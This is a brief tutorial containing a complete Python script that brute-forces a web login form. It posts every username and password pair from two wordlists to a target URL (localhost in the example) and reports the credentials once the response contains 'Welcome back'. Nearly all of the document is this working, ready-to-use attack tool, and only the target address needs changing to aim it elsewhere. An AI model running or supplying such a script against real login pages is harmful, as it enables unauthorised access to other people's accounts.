Use the request module to make a login bruteforce attack.

Being a double for loop, the time complexity is __O(n^2)__

The _needle_ is a specific piece of data that we know is contained in the event following a successfull login.


```python
import requests
import sys

prefix = "http://"
target_ip = "127.0.0.1"
target_port = ":5000"
target = prefix + target_ip + target_port

needle = "Welcome back"  # This is text returned in the content after a successful web POST login

usernames = "usernames_list.txt"
passwords = "passwords_list.txt"

with open(usernames, 'r') as usernames_list:
    for username in usernames_list:
        username = username.strip()  # Remove newline characters
        with open(passwords, 'r') as passwords_list:
            for password in passwords_list:
                password = password.strip("\n").encode() 
                r = requests.post(target, data={"username": username, "password": password})
                if r.status_code == 200 and needle in r.text:
                    sys.stdout.write("Valid Username:{} Password:{}".format(username, password))
                    sys.stdout.flush()
                    sys.exit()
            sys.stdout.write("No password found for Username:{}\n".format(username))
            sys.stdout.flush()
```
